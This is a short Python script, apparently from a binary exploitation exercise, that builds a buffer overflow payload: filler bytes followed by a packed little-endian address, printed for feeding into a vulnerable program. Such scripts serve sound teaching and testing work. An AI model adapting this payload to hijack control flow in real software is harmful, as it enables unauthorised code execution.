from struct import pack
p = bytes('AAAAAAAABBBB', 'ascii')
p += pack('<I', 0x0802840)
print(str(p)[2:-1])